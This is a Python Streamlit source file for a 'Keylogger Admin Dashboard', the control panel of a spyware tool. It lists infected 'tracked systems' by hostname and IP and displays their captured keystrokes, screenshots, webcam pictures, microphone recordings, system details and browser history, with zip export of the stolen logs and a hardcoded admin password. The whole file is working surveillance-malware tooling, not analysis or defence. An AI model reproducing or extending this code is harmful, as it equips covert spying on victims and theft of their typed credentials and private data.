import streamlit as st
import os
import json
import base64
from PIL import Image
from io import BytesIO
import bcrypt
from datetime import datetime
import utils
import db_utils
import pymongo
from pymongo import MongoClient

# Configuration
st.set_page_config(
    page_title="Keylogger Admin Dashboard",
    page_icon="🔒",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Initialize session state
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False
if 'current_page' not in st.session_state:
    st.session_state.current_page = "Login"
if 'admin_hash' not in st.session_state:
    # Pre-hash the password 'P@ssw0rd!'
    st.session_state.admin_hash = bcrypt.hashpw('P@ssw0rd!'.encode('utf-8'), bcrypt.gensalt())
if 'selected_user' not in st.session_state:
    st.session_state.selected_user = None

# Function to handle logout
def logout():
    st.session_state.authenticated = False
    st.session_state.current_page = "Login"
    st.session_state.selected_user = None
    st.rerun()

# Function to display the login page
def login_page():
    st.title("🔒 Keylogger Admin Dashboard")
    
    # Check MongoDB connection
    db_status = db_utils.test_connection()
    
    if not db_status:
        st.error("⚠️ Cannot connect to MongoDB database. Please check your connection settings.")
        
        # Display connection details (without password)
        st.info("MongoDB Connection: " + db_utils.MONGO_URI.split('@')[1])
        
        # Option to proceed anyway (for local file mode)
        if st.button("Continue with Local Files Only"):
            st.session_state.use_local_only = True
        else:
            return
    else:
        st.session_state.use_local_only = False
        st.success("✅ Connected to MongoDB database")
    
    with st.form("login_form"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        submit = st.form_submit_button("Login")
        
        if submit:
            if username == "admin" and bcrypt.checkpw(password.encode('utf-8'), st.session_state.admin_hash):
                st.session_state.authenticated = True
                st.session_state.current_page = "Dashboard"
                st.success("Login successful!")
                st.rerun()
            else:
                st.error("Invalid username or password")

# Function to ensure logs directory and decrypt files
def prepare_logs():
    with st.spinner("Preparing logs..."):
        log_path = utils.ensure_logs_directory()
        decrypted = utils.decrypt_files(log_path)
        if decrypted:
            st.success(f"Successfully decrypted {len(decrypted)} files")
        return log_path

# Function to display key logs
def show_key_logs(user_id=None):
    st.header("Keyboard Logs")
    
    if not user_id:
        # Local file mode
        log_path = prepare_logs()
        log_files = utils.get_log_files(log_path, "keylogs")
        
        if not log_files:
            st.warning("No key log files found")
            return
            
        for log_file in log_files:
            st.subheader(os.path.basename(log_file))
            content = utils.read_file_content(log_file)
            st.text_area("Log Content", content, height=400)
    else:
        # MongoDB mode
        with st.spinner("Loading keylog data..."):
            keylogs = db_utils.get_user_keylogs(user_id, limit=50)
            
            if not keylogs:
                st.warning("No key logs found for this user")
                return
                
            combined_logs = ""
            for log in keylogs:
                log_time = log["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
                combined_logs += f"--- Log from {log_time} ---\n"
                combined_logs += log["keylog_data"]
                combined_logs += "\n\n"
                
            st.text_area("Key Logs", combined_logs, height=400)

# Function to display screenshots
def show_screenshots(user_id=None):
    st.header("Screenshots")
    
    if not user_id:
        # Local file mode
        log_path = prepare_logs()
        screenshot_files = utils.get_log_files(log_path, "screenshots")
        
        if not screenshot_files:
            st.warning("No screenshots found")
            return
            
        # Create columns for displaying images
        cols = st.columns(3)
        
        for i, img_path in enumerate(screenshot_files):
            try:
                col_idx = i % 3
                with cols[col_idx]:
                    img = Image.open(img_path)
                    st.image(img, caption=f"Screenshot {i+1}: {os.path.basename(img_path)}", use_container_width=True)
            except Exception as e:
                st.error(f"Error loading image {img_path}: {str(e)}")
    else:
        # MongoDB mode
        with st.spinner("Loading screenshots..."):
            screenshots = db_utils.get_user_screenshots(user_id, limit=12)
            
            if not screenshots:
                st.warning("No screenshots found for this user")
                return
                
            # Create columns for displaying images
            cols = st.columns(3)
            
            for i, screenshot in enumerate(screenshots):
                try:
                    col_idx = i % 3
                    with cols[col_idx]:
                        # Convert binary data to image
                        img_data = screenshot["image_data"]
                        img = Image.open(BytesIO(img_data))
                        timestamp = screenshot["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
                        st.image(img, caption=f"Screenshot: {timestamp}", use_container_width=True)
                except Exception as e:
                    st.error(f"Error loading screenshot: {str(e)}")

# Function to display webcam pictures
def show_webcam_pics(user_id=None):
    st.header("Webcam Pictures")
    
    if not user_id:
        # Local file mode
        log_path = prepare_logs()
        webcam_files = utils.get_log_files(log_path, "webcam")
        
        if not webcam_files:
            st.warning("No webcam pictures found")
            return
            
        # Create columns for displaying images
        cols = st.columns(3)
        
        for i, img_path in enumerate(webcam_files):
            try:
                col_idx = i % 3
                with cols[col_idx]:
                    img = Image.open(img_path)
                    st.image(img, caption=f"Webcam {i+1}: {os.path.basename(img_path)}", use_container_width=True)
            except Exception as e:
                st.error(f"Error loading image {img_path}: {str(e)}")
    else:
        # MongoDB mode
        with st.spinner("Loading webcam pictures..."):
            webcam_pics = db_utils.get_user_webcam_pics(user_id, limit=12)
            
            if not webcam_pics:
                st.warning("No webcam pictures found for this user")
                return
                
            # Create columns for displaying images
            cols = st.columns(3)
            
            for i, webcam_pic in enumerate(webcam_pics):
                try:
                    col_idx = i % 3
                    with cols[col_idx]:
                        # Convert binary data to image
                        img_data = webcam_pic["image_data"]
                        img = Image.open(BytesIO(img_data))
                        timestamp = webcam_pic["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
                        st.image(img, caption=f"Webcam: {timestamp}", use_container_width=True)
                except Exception as e:
                    st.error(f"Error loading webcam picture: {str(e)}")

# Function to display microphone recordings
def show_mic_recordings(user_id=None):
    st.header("Microphone Recordings")
    
    if not user_id:
        # Local file mode
        log_path = prepare_logs()
        audio_files = utils.get_log_files(log_path, "microphone")
        
        if not audio_files:
            st.warning("No audio recordings found")
            return
            
        for audio_path in audio_files:
            try:
                st.subheader(os.path.basename(audio_path))
                
                # Read audio file as bytes
                with open(audio_path, "rb") as f:
                    audio_bytes = f.read()
                    
                # Display audio player
                st.audio(audio_bytes, format="audio/wav")
            except Exception as e:
                st.error(f"Error loading audio {audio_path}: {str(e)}")
    else:
        # MongoDB mode
        with st.spinner("Loading audio recordings..."):
            recordings = db_utils.get_user_audio_recordings(user_id, limit=10)
            
            if not recordings:
                st.warning("No audio recordings found for this user")
                return
                
            for i, recording in enumerate(recordings):
                try:
                    timestamp = recording["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
                    st.subheader(f"Recording {i+1}: {timestamp}")
                    
                    # Get audio data
                    audio_bytes = recording["audio_data"]
                    
                    # Display audio player
                    st.audio(audio_bytes, format="audio/wav")
                except Exception as e:
                    st.error(f"Error loading audio recording: {str(e)}")

# Function to display system information
def show_system_info(user_id=None):
    st.header("System Information")
    
    if not user_id:
        # Local file mode
        log_path = prepare_logs()
        system_files = utils.get_log_files(log_path, "system")
        
        if not system_files:
            st.warning("No system information files found")
            return
            
        for file_path in system_files:
            try:
                st.subheader(os.path.basename(file_path))
                content = utils.read_file_content(file_path)
                st.text_area(f"Content of {os.path.basename(file_path)}", content, height=300)
            except Exception as e:
                st.error(f"Error loading file {file_path}: {str(e)}")
    else:
        # MongoDB mode
        with st.spinner("Loading system information..."):
            system_info = db_utils.get_user_system_info(user_id)
            
            if not system_info:
                st.warning("No system information found for this user")
                return
                
            # Display system information
            st.subheader("System Information")
            
            # Format the data as a readable JSON string
            try:
                formatted_data = json.dumps(system_info["system_info"], indent=2)
                st.json(system_info["system_info"])
            except:
                # If data isn't proper JSON, display as text
                st.text_area("System Info Data", str(system_info["system_info"]), height=400)
            
            # Display when the data was updated
            if "updated_at" in system_info:
                st.info(f"Last updated: {system_info['updated_at'].strftime('%Y-%m-%d %H:%M:%S')}")

# Function to display browser history
def show_browser_history(user_id=None):
    st.header("Browser History")
    
    if not user_id:
        # Local file mode
        log_path = prepare_logs()
        browser_files = utils.get_log_files(log_path, "browser")
        
        if not browser_files:
            st.warning("No browser history found")
            return
            
        for file_path in browser_files:
            try:
                st.subheader("Browser History")
                content = utils.read_file_content(file_path)
                
                # Try to parse as JSON
                try:
                    data = json.loads(content)
                    st.json(data)
                except json.JSONDecodeError:
                    # If not valid JSON, display as text
                    st.text_area("Browser History Data", content, height=400)
            except Exception as e:
                st.error(f"Error loading browser history {file_path}: {str(e)}")
    else:
        # MongoDB mode
        with st.spinner("Loading browser history..."):
            browser_history = db_utils.get_user_browser_history(user_id, limit=5)
            
            if not browser_history:
                st.warning("No browser history found for this user")
                return
                
            for i, history in enumerate(browser_history):
                timestamp = history["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
                st.subheader(f"Browser History - {timestamp}")
                
                # Format the browser data
                try:
                    st.json(history["browser_data"])
                except:
                    # If data isn't proper JSON, display as text
                    st.text_area("Browser History Data", str(history["browser_data"]), height=400)

# Function to download all logs as a zip file
def download_all_logs(user_id=None):
    st.header("Download All Logs")
    
    if not user_id:
        # Local file mode
        log_path = prepare_logs()
        
        if st.button("Create Download Package"):
            with st.spinner("Creating zip archive..."):
                try:
                    # Create a zip file of all logs
                    zip_buffer = utils.create_zip_of_logs(log_path)
                    
                    # Create a download button
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    file_name = f"keylogger_logs_{timestamp}.zip"
                    
                    # Convert to b64 for download
                    b64 = base64.b64encode(zip_buffer.getvalue()).decode()
                    href = f'<a href="data:application/zip;base64,{b64}" download="{file_name}">Download ZIP File</a>'
                    st.markdown(href, unsafe_allow_html=True)
                    st.success("Zip archive created successfully!")
                except Exception as e:
                    st.error(f"Error creating zip archive: {str(e)}")
    else:
        # MongoDB mode - We need to implement a function to download user data as a zip
        st.info("This feature is not yet implemented for MongoDB data")
        
        # TODO: Implement a way to export MongoDB data as a zip file
        if st.button("Export User Data (Coming Soon)"):
            st.warning("This feature is under development")

# Function to display the tracked users
def show_users():
    st.header("Tracked Systems")
    
    with st.spinner("Loading tracked systems..."):
        users = db_utils.get_all_users()
        
        if not users:
            st.warning("No tracked systems found")
            return
            
        # Create a table to display user information
        user_data = []
        for user in users:
            # Format the timestamps
            first_seen = user["first_seen"].strftime("%Y-%m-%d %H:%M:%S") if "first_seen" in user else "Unknown"
            last_active = user["last_active"].strftime("%Y-%m-%d %H:%M:%S") if "last_active" in user else "Unknown"
            
            user_data.append({
                "User ID": user["user_id"],
                "Hostname": user["hostname"],
                "IP Address": user["ip_address"],
                "First Seen": first_seen,
                "Last Active": last_active
            })
        
        # Display the table
        st.table(user_data)
        
        # Create a selectbox to choose a user
        user_options = [f"{u['hostname']} ({u['user_id']})" for u in users]
        selected_option = st.selectbox("Select a system to view its data:", user_options)
        
        if selected_option:
            # Extract the user_id from the selection
            selected_user_id = selected_option.split('(')[1].split(')')[0]
            st.session_state.selected_user = selected_user_id
            st.success(f"Selected system: {selected_user_id}")
            
            if st.button("View Selected System Data"):
                st.session_state.current_page = "Dashboard"
                st.rerun()

# Main dashboard function
def dashboard():
    st.title("🔒 Keylogger Admin Dashboard")
    
    # Sidebar navigation
    st.sidebar.title("Navigation")
    
    # If using MongoDB and a user is selected, show user info
    if not st.session_state.get('use_local_only', True) and st.session_state.selected_user:
        st.sidebar.success(f"Viewing data for system: {st.session_state.selected_user}")
        
        # Option to go back to user list
        if st.sidebar.button("⬅️ Back to System List"):
            st.session_state.current_page = "Users"
            st.rerun()
    
    # Navigation options
    page_options = ["Key Logs", "Screenshots", "Webcam Pictures", "Microphone Recordings", 
                   "System Info", "Browser History", "Download Logs"]
                   
    # Add Users page if MongoDB is available
    if not st.session_state.get('use_local_only', True):
        page_options.append("Tracked Systems")
    
    page = st.sidebar.radio("Go to", page_options)
    
    # Logout button
    if st.sidebar.button("Logout"):
        logout()
    
    # If using local files, prepare logs directory
    if st.session_state.get('use_local_only', True):
        log_path = prepare_logs()
        user_id = None
    else:
        log_path = None
        user_id = st.session_state.selected_user
    
    # Show the selected page
    if page == "Key Logs":
        show_key_logs(user_id)
    elif page == "Screenshots":
        show_screenshots(user_id)
    elif page == "Webcam Pictures":
        show_webcam_pics(user_id)
    elif page == "Microphone Recordings":
        show_mic_recordings(user_id)
    elif page == "System Info":
        show_system_info(user_id)
    elif page == "Browser History":
        show_browser_history(user_id)
    elif page == "Download Logs":
        download_all_logs(user_id)
    elif page == "Tracked Systems":
        st.session_state.current_page = "Users"
        st.rerun()

# User list page
def user_list_page():
    st.title("🔒 Keylogger Admin Dashboard - Tracked Systems")
    
    # Sidebar navigation
    st.sidebar.title("Navigation")
    
    # Back to dashboard
    if st.sidebar.button("⬅️ Back to Dashboard"):
        st.session_state.current_page = "Dashboard"
        st.rerun()
    
    # Logout button
    if st.sidebar.button("Logout"):
        logout()
    
    # Display user list
    show_users()

# Main application flow
def main():
    if not st.session_state.authenticated:
        login_page()
    elif st.session_state.current_page == "Dashboard":
        dashboard()
    elif st.session_state.current_page == "Users":
        user_list_page()
    else:
        login_page()

if __name__ == "__main__":
    main()